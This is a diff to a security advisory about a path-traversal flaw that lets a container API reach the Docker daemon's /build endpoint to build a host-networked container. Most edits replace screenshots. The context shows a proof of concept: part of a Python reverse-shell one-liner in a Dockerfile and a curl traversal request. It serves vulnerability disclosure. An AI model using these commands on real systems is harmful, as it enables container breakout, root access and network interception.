@@ -43,9 +43,10 @@ export async function execInContainer(
 	);
 ```
 
-- `/build` route in docker daemon api allows users to build container from a remote url with the `remote` parameter along with the `networkMode` parameter set to `host` which grants full host network access.  It reduces the impact but in some machine docker daemon might be exposed on `localhost:2375` which can allow an attacker to build malicious container and breakout as root serving as a Privilege Escalation vector. [Docker docs](https://docs.docker.com/reference/api/engine/version/v1.48/#tag/Image/operation/ImageBuild)-:
+- `/build` route in docker daemon api allows users to build container from a remote url with the `remote` parameter along with the `networkMode` parameter set to `host` which grants full host network access.  It reduces the impact but in some machine docker daemon might be exposed on `localhost:2375` which can allow an attacker to build malicious container and breakout as root serving as a Privilege Escalation vector.[Docker docs](https://docs.docker.com/reference/api/engine/version/v1.48/#tag/Image/operation/ImageBuild)-:
 
-<img width="1521" height="869" alt="image" src="https://github.com/user-attachments/assets/864fed9a-875e-4452-836a-902814add95a" />
+<img width="1521" height="869" alt="image" src="https://github.com/user-attachments/assets/266d307a-4901-453d-9868-e9f6fc129a3c" />
+
 
 ### PoC
 - Host this dockerfile on a vps or github repository.It creates a sandboxed alpine image and sends a reverse shell to the target host
@@ -68,23 +69,26 @@ RUN python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ip>",8000));
 ```bash
 curl --path-as-is http://<url>/api/containers/%2e%2e%2fbuild%3fremote=<url urlencoded>%26t=sweptme:latest%26networkmode=host%26version=1%23/top?env=1
 ```
-<img width="1906" height="104" alt="image" src="https://github.com/user-attachments/assets/008e8b19-8424-4939-972a-06b3fe63ee39" />
+<img width="1906" height="104" alt="image" src="https://github.com/user-attachments/assets/e8cefee3-9840-4675-b715-0d60a81667fd" />
 
-- SSRF-:
 
-<img width="678" height="113" alt="image" src="https://github.com/user-attachments/assets/b80c337b-ca69-42c7-b66f-1826438907a0" />
+- Building Image-:
+
+<img width="678" height="113" alt="image" src="https://github.com/user-attachments/assets/fe96cf41-5417-4302-896e-997c0befc17c" />
 
 - Reverse Shell-:
 
-<img width="546" height="105" alt="image" src="https://github.com/user-attachments/assets/132d0ca2-b04e-493b-ac6b-3e42fb04ef20" />
+<img width="546" height="105" alt="image" src="https://github.com/user-attachments/assets/630b8e70-6edb-4f2d-8d19-144f4f679922" />
+
 
 - Full host network access allowing mitm attacks-:
 
-<img width="1331" height="974" alt="image" src="https://github.com/user-attachments/assets/5b2463e3-c8ed-48cf-8769-011188bd5ca9" />
+<img width="1331" height="974" alt="image" src="https://github.com/user-attachments/assets/c43b27dd-42e0-417f-a23c-688ab223d076" />
+
 
 - Accessing the http server created earlier from the sandbox-:
 
-<img width="851" height="761" alt="image" src="https://github.com/user-attachments/assets/9da475bf-b703-4d8d-857a-5acaf8730eb2" />
+<img width="851" height="761" alt="image" src="https://github.com/user-attachments/assets/48285267-56f7-451a-adba-09c7c3fd8e0b" />
 
 
 ### Impact
